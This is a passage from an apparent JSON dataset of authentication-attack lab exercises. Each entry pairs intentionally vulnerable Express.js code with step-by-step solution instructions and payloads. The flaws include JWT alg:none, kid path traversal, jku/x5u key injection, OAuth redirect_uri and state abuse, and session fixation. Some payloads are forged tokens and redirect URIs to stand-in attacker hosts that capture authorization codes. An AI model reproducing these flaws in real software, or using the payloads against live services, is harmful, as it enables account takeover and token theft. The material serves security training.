    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst users = {\n  'user1': { password: 'pass123', role: 'user' },\n  'admin': { password: 'admin456', role: 'admin' }\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    const token = jwt.sign({ user: username, role: users[username].role }, 'secretkey');\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.decode(token, { complete: true });\n    if (decoded.header.alg === 'none') {\n      if (decoded.payload.role === 'admin') {\n        return res.send('Admin access granted');\n      }\n    } else {\n      jwt.verify(token, 'secretkey');\n    }\n    res.send('Access denied');\n  } catch (err) {\n    res.status(403).send('Invalid token');\n  }\n});\n\nconst PORT = 3000;\napp.listen(PORT, () => console.log(`JWT Lab running on port ${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlcjEiLCJyb2xlIjoiYWRtaW4ifQ.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured redirect_uri",
    "Lab Description": "The OAuth implementation fails to validate redirect_uri parameters properly. The application leaks authorization codes to arbitrary domains. To solve: steal an OAuth token by intercepting the authorization flow and modifying the redirect URI.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth flow and intercept the /authorize request with Burp",
      "Modify the redirect_uri parameter to point to your attacker server",
      "Let the victim complete the authentication (simulated in lab)",
      "Capture the authorization code from your server logs",
      "Exchange the stolen code for an access token at the /token endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'labClient': {\n    secret: 'clientsecret123',\n    allowedRedirects: ['https://lab-client.com/callback']\n  }\n};\n\nconst authCodes = {};\nconst tokens = {};\n\napp.get('/authorize', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  if (!clients[client_id]) return res.status(400).send('Invalid client');\n  \n  const code = generateRandomCode();\n  authCodes[code] = { client_id };\n  \n  res.redirect(`${redirect_uri}?code=${code}`);\n});\n\napp.post('/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  if (!clients[client_id] || clients[client_id].secret !== client_secret) {\n    return res.status(401).json({ error: 'Invalid client credentials' });\n  }\n  if (!authCodes[code]) return res.status(400).json({ error: 'Invalid code' });\n  \n  const token = generateRandomToken();\n  tokens[token] = { client_id };\n  delete authCodes[code];\n  \n  res.json({ access_token: token, token_type: 'Bearer' });\n});\n\nfunction generateRandomCode() {\n  return Math.random().toString(36).substring(2, 15);\n}\n\nfunction generateRandomToken() {\n  return Math.random().toString(36).substring(2) + Math.random().toString(36).substring(2);\n}\n\nconst PORT = 3001;\napp.listen(PORT, () => console.log(`OAuth Server running on port ${PORT}`));",
    "payloads": [
      "https://attacker.com/callback",
      "http://localhost:9999/steal",
      "https://evil.com/oauth_callback"
    ]
  },
  {
    "Lab scenario": "Session fixation in GraphQL authentication endpoint",
    "Lab Description": "The GraphQL API assigns session tokens before authentication is complete. The application doesn't regenerate tokens after login. To solve: fixate a session token on victim then trigger authentication to gain access.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Send an unauthenticated GraphQL query to obtain a session cookie",
      "Preserve this cookie and craft a phishing link containing it",
      "Trigger victim login (simulated in lab) with the fixated session",
      "Use the same session cookie to access authenticated endpoints",
      "Query sensitive user data through GraphQL to complete the lab"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst cookieParser = require('cookie-parser');\nconst app = express();\n\napp.use(cookieParser());\n\nconst schema = buildSchema(`\n  type Query {\n    getSession: String\n    getUserData: String\n  }\n  type Mutation {\n    login(username: String!, password: String!): String\n  }\n`);\n\nconst sessions = {};\nconst users = {\n  admin: { password: 'secret123', data: 'Sensitive admin data' }\n};\n\nconst root = {\n  getSession: (args, req) => {\n    if (!req.cookies.session) {\n      const sessionId = generateSessionId();\n      sessions[sessionId] = { authenticated: false };\n      req.res.cookie('session', sessionId);\n      return 'New session created';\n    }\n    return 'Existing session';\n  },\n  login: ({ username, password }, req) => {\n    const sessionId = req.cookies.session;\n    if (!sessionId || !sessions[sessionId]) return 'Invalid session';\n    \n    if (users[username] && users[username].password === password) {\n      sessions[sessionId].authenticated = true;\n      sessions[sessionId].username = username;\n      return 'Login successful';\n    }\n    return 'Invalid credentials';\n  },\n  getUserData: (args, req) => {\n    const sessionId = req.cookies.session;\n    if (!sessionId || !sessions[sessionId] || !sessions[sessionId].authenticated) {\n      return 'Access denied';\n    }\n    return users[sessions[sessionId].username].data;\n  }\n};\n\nfunction generateSessionId() {\n  return Math.random().toString(36).substring(2, 15);\n}\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  rootValue: root,\n  graphiql: true\n}));\n\nconst PORT = 4000;\napp.listen(PORT, () => console.log(`GraphQL Session Lab running on port ${PORT}`));",
    "payloads": [
      "mutation { login(username: \"admin\", password: \"secret123\") }",
      "query { getUserData }",
      "query { getSession }"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice authentication",
    "Lab Description": "The JWT verification microservice improperly validates the kid (key ID) header parameter. The application allows directory traversal in key file lookup. To solve: forge a valid admin token by manipulating the kid header to reference a predictable local file.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid API request with Burp Suite to capture the JWT",
      "Decode the token and identify the vulnerable kid header parameter",
      "Modify the kid header to point to /dev/null or /proc/self/environ",
      "Sign the modified token with a blank key or environment variables",
      "Submit the forged token to access admin endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\nconst keys = {\n  'default': fs.readFileSync('./keys/default.key')\n};\n\napp.post('/verify', (req, res) => {\n  const { token } = req.body;\n  try {\n    const decoded = jwt.decode(token, { complete: true });\n    const kid = decoded.header.kid;\n    const key = kid ? fs.readFileSync(kid) : keys['default'];\n    const verified = jwt.verify(token, key);\n    res.json({ valid: true, user: verified.user });\n  } catch (err) {\n    res.status(403).json({ valid: false });\n  }\n});\n\nconst PORT = 3001;\napp.listen(PORT, () => console.log(`JWT Verifier running on port ${PORT}`));",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii9kZXYvbnVsbCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.1dX6kP4W7tQ4x7Z3J2J2J2J2J2J2J2J2J2J2J2J2J2J2",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii9wcm9jL3NlbGYvZW52aXJvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.3J2J2J2J2J2J2J2J2J2J2J2J2J2J2J2J2J2J2J2"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via insecure state parameter",
    "Lab Description": "The OAuth implementation fails to properly validate the state parameter between requests. The application associates tokens with the wrong session if state changes mid-flow. To solve: intercept the OAuth flow and swap the state parameter to hijack another user's token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth login and intercept the /authorize request with OWASP ZAP",
      "Note the original state parameter and let the request proceed",
      "Intercept the callback request before the state validation occurs",
      "Modify the state parameter to match an active victim session",
      "Complete the flow to receive the victim's access token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\n\nconst authSessions = {};\nconst accessTokens = {};\n\napp.get('/authorize', (req, res) => {\n  const { client_id, state } = req.query;\n  const sessionId = crypto.randomBytes(16).toString('hex');\n  authSessions[sessionId] = { client_id, state };\n  res.redirect(`/login?session=${sessionId}`);\n});\n\napp.get('/callback', (req, res) => {\n  const { code, state } = req.query;\n  const session = Object.values(authSessions).find(s => s.state === state);\n  if (!session) return res.status(400).send('Invalid state');\n  \n  const token = crypto.randomBytes(24).toString('hex');\n  accessTokens[token] = { client_id: session.client_id };\n  res.redirect(`${session.redirect_uri}?token=${token}`);\n});\n\nconst PORT = 3002;\napp.listen(PORT, () => console.log(`OAuth Provider running on port ${PORT}`));",
    "payloads": [
      "state=attacker_state&client_id=lab_client",
      "state=victim_state&code=intercepted_code"
    ]
  },
  {
    "Lab scenario": "Session prediction via insecure cookie generation",
    "Lab Description": "The application uses predictable session cookie generation based on timestamps. The cookie can be brute-forced by enumerating possible time values. To solve: predict an active admin session cookie by analyzing the cookie generation pattern.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture multiple session cookies with Burp Suite over time",
      "Analyze cookie structure using CyberChef to identify timestamp pattern",
      "Generate possible cookies for current time window using Python script",
      "Use Burp Intruder to brute-force cookies in the predicted range",
      "Identify valid cookie through response length differences"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\nconst sessions = {};\n\napp.get('/login', (req, res) => {\n  const { username, password } = req.query;\n  if (username === 'admin' && password === 's3cr3tP@ss') {\n    const sessionId = generateSessionId();\n    sessions[sessionId] = { username: 'admin', lastAccess: Date.now() };\n    res.cookie('session', sessionId);\n    return res.send('Admin logged in');\n  }\n  res.status(403).send('Invalid credentials');\n});\n\napp.get('/admin', (req, res) => {\n  const sessionId = req.cookies.session;\n  if (sessions[sessionId]?.username === 'admin') {\n    return res.send('Sensitive admin data');\n  }\n  res.status(403).send('Access denied');\n});\n\nfunction generateSessionId() {\n  const timePart = Math.floor(Date.now() / 1000).toString(16);\n  const randPart = Math.floor(Math.random() * 1000).toString(16);\n  return `${timePart}-${randPart}`;\n}\n\nconst PORT = 3003;\napp.listen(PORT, () => console.log(`Session Lab running on port ${PORT}`));",
    "payloads": [
      "647a3b1a-3e8",
      "647a3b1b-1a5",
      "647a3b1c-7f2"
    ]
  },
  {
    "Lab scenario": "JWT public key substitution via jku header injection",
    "Lab Description": "The JWT validation endpoint trusts arbitrary jku (JSON Key URL) headers. The application fails to verify the source of public keys. To solve: forge a valid admin token by hosting a malicious JWKS endpoint and injecting your public key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT with Burp Suite and note the jku header",
      "Generate a RSA key pair using OpenSSL",
      "Host a malicious JWKS endpoint with your public key",
      "Craft a new JWT with modified claims and jku pointing to your endpoint",
      "Submit the forged token to bypass authentication"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst jwksClient = require('jwks-rsa');\nconst app = express();\n\nconst client = jwksClient({\n  jwksUri: 'https://trusted-keys.example.com/.well-known/jwks.json'\n});\n\napp.post('/verify', (req, res) => {\n  const { token } = req.body;\n  const decoded = jwt.decode(token, { complete: true });\n  \n  if (decoded.header.jku) {\n    client = jwksClient({ jwksUri: decoded.header.jku });\n  }\n  \n  client.getSigningKey(decoded.header.kid, (err, key) => {\n    if (err) return res.status(403).send('Invalid key');\n    jwt.verify(token, key.getPublicKey(), (err, decoded) => {\n      if (err) return res.status(403).send('Invalid token');\n      res.json({ valid: true, user: decoded.user });\n    });\n  });\n});\n\nconst PORT = 3001;\napp.listen(PORT, () => console.log(`JWT Validator running on port ${PORT}`));",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXItc2l0ZS5jb20va2V5cy5qc29uIiwia2lkIjoiYXR0YWNrZXJLZXkifQ.eyJ1c2VyIjoiYWRtaW4ifQ.fake-signature",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6OTk5OS9tYWxpY2lvdXMuanNvbiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.fake-sig"
    ]
  },
  {
    "Lab scenario": "OAuth token hijack via insecure PKCE implementation",
    "Lab Description": "The OAuth provider fails to properly validate Proof Key for Code Exchange (PKCE) parameters. The application accepts authorization codes without matching code verifiers. To solve: steal an authorization code and exchange it for a token without knowing the original code_verifier.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept OAuth flow with OWASP ZAP to capture authorization request",
      "Note the code_challenge parameter but disregard it",
      "Intercept the redirect containing the authorization code",
      "Exchange the stolen code at the token endpoint without code_verifier",
      "Use the access token to impersonate the victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\n\nconst authCodes = {};\nconst accessTokens = {};\n\napp.get('/authorize', (req, res) => {\n  const { client_id, code_challenge } = req.query;\n  const code = crypto.randomBytes(16).toString('hex');\n  authCodes[code] = { client_id };\n  res.redirect(`/callback?code=${code}`);\n});\n\napp.post('/token', (req, res) => {\n  const { client_id, code } = req.body;\n  if (!authCodes[code]) return res.status(400).json({ error: 'Invalid code' });\n  \n  const token = crypto.randomBytes(24).toString('hex');\n  accessTokens[token] = { client_id };\n  delete authCodes[code];\n  \n  res.json({ access_token: token });\n});\n\nconst PORT = 3002;\napp.listen(PORT, () => console.log(`OAuth Server running on port ${PORT}`));",
    "payloads": [
      "client_id=webapp&code_challenge=unverifiedChallenge",
      "client_id=webapp&code=stolenCode"
    ]
  },
  {
    "Lab scenario": "Session fixation via subdomain cookie scope",
    "Lab Description": "The application sets session cookies with overly broad domain scope (.example.com). The cookie can be fixed across subdomains. To solve: obtain a session cookie from a vulnerable subdomain and reuse it on the target application.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Discover vulnerable subdomain (legacy.example.com) using Sublist3r",
      "Interact with vulnerable endpoint to receive a session cookie",
      "Note the cookie's domain attribute is set to .example.com",
      "Navigate to secure.example.com with the same cookie",
      "Access authenticated resources on the secure subdomain"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst cookieParser = require('cookie-parser');\nconst app = express();\napp.use(cookieParser());\n\napp.get('/login', (req, res) => {\n  const { username, password } = req.query;\n  if (username === 'admin' && password === 'admin123') {\n    res.cookie('session', 'fixedSession123', { domain: '.example.com' });\n    return res.send('Logged in');\n  }\n  res.status(403).send('Invalid credentials');\n});\n\napp.get('/admin', (req, res) => {\n  if (req.cookies.session === 'fixedSession123') {\n    return res.send('Admin dashboard');\n  }\n  res.status(403).send('Access denied');\n});\n\nconst PORT = 3003;\napp.listen(PORT, () => console.log(`Session App running on port ${PORT}`));",
    "payloads": [
      "session=fixedSession123",
      "session=anotherFixedSession"
    ]
  },
  {
    "Lab scenario": "JWT x5u header SSRF in microservice authentication",
    "Lab Description": "The JWT validation service blindly trusts x5u header certificates from external URLs. The application fails to sanitize certificate fetch requests. To solve: forge an admin token by hosting a malicious X.509 certificate and exploiting SSRF in the certificate fetching process.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept a valid JWT with Burp Suite and note the x5u header",
      "Generate a self-signed X.509 certificate with admin privileges",
      "Host the certificate on a controlled server with SSRF exploitable endpoint",
      "Craft a JWT with x5u pointing to your malicious certificate",
      "Submit the token to trigger certificate fetch and gain admin access"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst https = require('https');\nconst app = express();\n\napp.post('/verify', (req, res) => {\n  const { token } = req.body;\n  const decoded = jwt.decode(token, { complete: true });\n  \n  if (decoded.header.x5u) {\n    https.get(decoded.header.x5u, (certRes) => {\n      let certData = '';\n      certRes.on('data', (chunk) => certData += chunk);\n      certRes.on('end', () => {\n        try {\n          const verified = jwt.verify(token, certData);\n          res.json({ valid: true, user: verified.user });\n        } catch (e) {\n          res.status(403).json({ valid: false });\n        }\n      });\n    });\n  } else {\n    res.status(400).json({ error: 'x5u header required' });\n  }\n});\n\nconst PORT = 3001;\napp.listen(PORT, () => console.log(`JWT Validator running on port ${PORT}`));",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXItc2l0ZS5jb20vbWFsY2VydC5wZW0ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.fake-sig",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly9sb2NhbGhvc3Q6OTk5OS9ldmlsLmNlcnQifQ.eyJ1c2VyIjoiYWRtaW4ifQ.fake-sig"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via insecure fragment redirect",
    "Lab Description": "The OAuth implementation leaks access tokens in URL fragments during redirects. The application fails to properly handle the response_type=token flow. To solve: intercept the redirect and extract the token from the fragment before the client-side JavaScript processes it.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Initiate OAuth flow with response_type=token using Postman",
      "Intercept the redirect response with Burp Proxy before JavaScript executes",
      "Extract the access_token from the URL fragment",
      "Use the token directly in API requests",
      "Access protected resources as the victim user"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst crypto = require('crypto');\nconst app = express();\n\nconst clients = {\n  'webapp': { secret: 'clientsecret123', redirect_uri: 'https://client.com/callback' }\n};\n\napp.get('/authorize', (req, res) => {\n  const { client_id, response_type } = req.query;\n  if (response_type === 'token') {\n    const token = crypto.randomBytes(24).toString('hex');\n    return res.redirect(`${clients[client_id].redirect_uri}#access_token=${token}`);\n  }\n  res.status(400).send('Invalid response_type');\n});\n\nconst PORT = 3002;\napp.listen(PORT, () => console.log(`OAuth Provider running on port ${PORT}`));",
    "payloads": [
      "response_type=token&client_id=webapp",
      "response_type=token&client_id=webapp&redirect_uri=https://attacker.com/callback"
    ]
  },
  {
    "Lab scenario": "Session hijacking via WebSocket authentication bypass",
    "Lab Description": "The application authenticates WebSocket connections using predictable session tokens. The WebSocket endpoint fails to validate token origin. To solve: predict or intercept a WebSocket session token and hijack an active session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture WebSocket handshake requests with OWASP ZAP",
      "Analyze session token generation algorithm",
      "Predict valid tokens based on timestamp patterns",
      "Connect to WebSocket endpoint with predicted token",
      "Intercept and manipulate real-time communications"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\n\nconst server = app.listen(3003);\nconst wss = new WebSocket.Server({ server });\n\nwss.on('connection', (ws, req) => {\n  const token = req.url.split('token=')[1];\n  if (!token || !validateToken(token)) {\n    return ws.close(1008, 'Invalid token');\n  }\n  \n  ws.on('message', (message) => {\n    wss.clients.forEach((client) => {\n      if (client !== ws && client.readyState === WebSocket.OPEN) {\n        client.send(message);\n      }\n    });\n  });\n});\n\nfunction validateToken(token) {\n  return token.startsWith('ws-') && token.length === 32;\n}\n\nconsole.log(`WebSocket Server running on port 3003`);",
    "payloads": [
      "ws-7c6d5f4e3d2c1b0a9f8e7d6c5b4a3",
      "ws-00000000000000000000000000000000"
    ]
  },
  {
    "Lab scenario": "JWT alg:none exploitation in REST API authentication",
    "Lab Description": "The application uses JSON Web Tokens with improper signature validation. The vulnerable endpoint accepts unsigned tokens when the alg header is set to 'none'. To solve: forge an administrative JWT by removing the signature and modifying claims.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept valid JWT in Burp Suite while browsing authenticated sections",
      "Decode the JWT using jwt.io or Burp Decoder to analyze structure",
      "Modify the alg header to 'none' and remove signature section",
      "Change 'role' claim from 'user' to 'admin' and remove signature entirely",
      "Submit modified token in Authorization header to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst users = {\n  'user1': { password: 'pass123', role: 'user' },\n  'admin': { password: 'adminPass', role: 'admin' }\n};\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  if (users[username] && users[username].password === password) {\n    const token = jwt.sign({ user: username, role: users[username].role }, 'secretKey', { algorithm: 'HS256' });\n    res.json({ token });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization?.split(' ')[1];\n  try {\n    const decoded = jwt.verify(token, 'secretKey', { algorithms: ['HS256', 'none'] });\n    if (decoded.role === 'admin') {\n      res.send('Admin panel accessed');\n    } else {\n      res.status(403).send('Forbidden');\n    }\n  } catch (err) {\n    res.status(401).send('Invalid token');\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoidXNlcjEiLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MTgwMjY1MjJ9.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWUsImlhdCI6MTUxNjIzOTAyMn0"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via misconfigured redirect_uri in social login",
    "Lab Description": "The application's OAuth implementation fails to validate redirect_uri parameters properly, allowing authorization code interception. The vulnerable flow leaks tokens to attacker-controlled domains. To solve: steal authorization code by manipulating redirect_uri and exchange it for access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth flow and intercept /authorize request in Burp Suite",
      "Modify redirect_uri parameter to attacker-controlled domain",
      "Capture authorization code when victim gets redirected",
      "Exchange stolen code for access token at /oauth/token endpoint",
      "Use access token to authenticate as victim via API"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst axios = require('axios');\nconst app = express();\n\nconst clients = {\n  'client123': {\n    secret: 'sec789',\n    allowedRedirects: ['https://trusted.com/callback']\n  }\n};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, redirect_uri } = req.query;\n  if (!clients[client_id]) return res.status(400).send('Invalid client');\n  \n  const code = 'authcode_' + Math.random().toString(36).substr(2,9);\n  res.redirect(`${redirect_uri}?code=${code}`);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const { client_id, client_secret, code } = req.body;\n  if (clients[client_id]?.secret === client_secret) {\n    res.json({\n      access_token: 'access_' + Math.random().toString(36).substr(2,12),\n      token_type: 'Bearer'\n    });\n  } else {\n    res.status(401).send('Invalid credentials');\n  }\n});\n\napp.listen(3001);",
    "payloads": [
      "https://attacker.com/callback?code=stolen_code",
      "http://localhost:9999/leak?code=STOLEN123",
      "https://trusted.com.collab.com/capture?code=ABC123"
    ]
  },
  {
    "Lab scenario": "Session fixation via unsafe session regeneration in GraphQL endpoint",
    "Lab Description": "The application's GraphQL API maintains sessions after password changes without proper invalidation. The vulnerable mutation allows maintaining active sessions post-authentication changes. To solve: fixate session on victim account before password change, then reuse session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture session cookie during account registration using OWASP ZAP",
      "Initiate password reset flow for victim account while maintaining session",
      "Verify continued session validity after password change via Postman",
      "Execute privileged GraphQL mutations using fixated session",
      "Extract sensitive data through malformed queries"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst { buildSchema } = require('graphql');\nconst cookieParser = require('cookie-parser');\n\nconst schema = buildSchema(`\n  type Query {\n    getUser(id: ID!): User\n  }\n  type Mutation {\n    changePassword(old: String!, new: String!): Boolean\n  }\n  type User {\n    id: ID!\n    email: String!\n    admin: Boolean!\n  }\n`);\n\nconst users = {\n  '1': { email: 'user@test.com', password: 'oldPass', admin: false }\n};\n\nconst root = {\n  getUser: ({id}) => users[id],\n  changePassword: ({old, new: newPass}, req) => {\n    if (users[req.userId].password === old) {\n      users[req.userId].password = newPass;\n      return true;\n    }\n    return false;\n  }\n};\n\nconst app = express();\napp.use(cookieParser());\n\napp.use('/graphql', (req, res) => {\n  const userId = req.cookies.session || '1';\n  req.userId = userId;\n  \n  graphqlHTTP({\n    schema: schema,\n    rootValue: root,\n    context: { req, res },\n    graphiql: true\n  })(req, res);\n});\n\napp.listen(4000);",
    "payloads": [
      "mutation { changePassword(old: \"victimPass\", new: \"hacked123\") }",
      "query { getUser(id: \"1\") { email admin } }",
      "{\"query\":\"mutation { changePassword(old: \\\"temp123\\\", new: \\\"attackerPass\\\") }\",\"variables\":null}"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in microservice authentication",
    "Lab Description": "The application's JWT validation improperly uses user-controlled kid header to load verification keys from filesystem. The vulnerable implementation allows directory traversal via kid parameter. To solve: forge admin token by forcing system to use attacker-controlled public key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT in Burp Suite and note kid header value",
      "Modify kid header to point to /dev/null or /proc/self/environ",
      "Observe server error messages revealing filesystem structure",
      "Craft malicious JWT with kid pointing to /tmp/attacker_key.pub",
      "Upload RSA public key to predictable temporary location and validate forged token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\nconst users = {\n  'user': { role: 'user', key: 'keys/user.pub' },\n  'admin': { role: 'admin', key: 'keys/admin.pub' }\n};\n\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  try {\n    const decoded = jwt.decode(token, { complete: true });\n    const keyPath = decoded.header.kid || 'keys/default.pub';\n    const pubKey = fs.readFileSync(keyPath);\n    const payload = jwt.verify(token, pubKey);\n    res.json({ access: payload.role });\n  } catch (e) {\n    res.status(500).json({ error: e.message });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uLy4uLy90bXAvYXR0YWNrZXJfa2V5LnB1YiIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature",
      "eyJhbGciOiJSUzI1NiIsImtpZCI6Ii9kZXYvbnVsbCIsInR5cCI6IkpXVCJ9.eyJyb2xlIjoiYWRtaW4ifQ.fake-signature"
    ]
  },
  {
    "Lab scenario": "Session hijacking via WebSocket connection hijack",
    "Lab Description": "The application's WebSocket handshake fails to validate session transition from HTTP to WS protocol. The vulnerable implementation accepts existing HTTP cookies without re-authentication. To solve: hijack active session by intercepting WebSocket upgrade request.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture WebSocket connection sequence using OWASP ZAP",
      "Intercept WS upgrade request containing session cookie",
      "Modify Origin header to bypass same-origin checks",
      "Replay captured cookies in new WebSocket connection",
      "Execute privileged actions through hijacked WS channel"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\n\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\n\napp.use((req, res, next) => {\n  res.cookie('session', 'fixed-value', { httpOnly: true });\n  next();\n});\n\nwss.on('connection', (ws, req) => {\n  const cookies = req.headers.cookie;\n  ws.send('Connected with session: ' + cookies);\n  \n  ws.on('message', (data) => {\n    if (cookies.includes('admin=true')) {\n      ws.send('Admin command executed: ' + data);\n    } else {\n      ws.send('Unauthorized');\n    }\n  });\n});",
    "payloads": [
      "GET /ws HTTP/1.1\r\nHost: vulnerable.com\r\nCookie: session=stolen-value; admin=true\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n\r\n",
      "{\"type\":\"command\",\"data\":\"get_secrets\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping via insecure state parameter",
    "Lab Description": "The application's OAuth flow fails to properly validate state parameter between requests. The vulnerable implementation allows swapping authorization codes between clients. To solve: intercept victim's auth code and associate it with attacker's session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Initiate OAuth flow and capture state parameter in Burp Suite",
      "Trick victim into initiating OAuth with known state value",
      "Intercept victim's authorization code before redirection",
      "Swap victim's code into attacker's OAuth callback request",
      "Complete OAuth flow with victim's permissions"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nconst authCodes = {};\nconst tokens = {};\n\napp.get('/oauth/authorize', (req, res) => {\n  const { client_id, state } = req.query;\n  authCodes[state] = { client_id, user: 'victim' };\n  res.redirect(`/callback?code=auth_code_${Date.now()}&state=${state}`);\n});\n\napp.get('/oauth/token', (req, res) => {\n  const { code, state } = req.query;\n  if (authCodes[state]) {\n    tokens[code] = { \n      access_token: `token_${Math.random().toString(36).substr(2)}`,\n      user: authCodes[state].user\n    };\n    res.json(tokens[code]);\n  } else {\n    res.status(400).json({ error: 'Invalid state' });\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "/oauth/authorize?client_id=attacker&state=fixed-value",
      "/oauth/token?code=victim_code&state=fixed-value",
      "/callback?code=victim_code&state=fixed-value"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion attack in REST API authentication",
    "Lab Description": "The application's JWT implementation fails to validate the algorithm specified in the token header against the server's expected algorithm. The vulnerable endpoint accepts RS256-signed tokens when configured for HS256. To solve: forge a valid JWT by converting public key to HMAC secret.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT in Burp Suite and decode to identify RS256 algorithm",
      "Extract public key from /jwks.json or /certificate endpoints",
      "Convert RSA public key to HMAC secret using Python script",
      "Forge new token with HS256 algorithm and admin claims",
      "Submit forged token in Authorization header to /admin endpoint"
    ],
    "Vulnerability name": "Authentication",
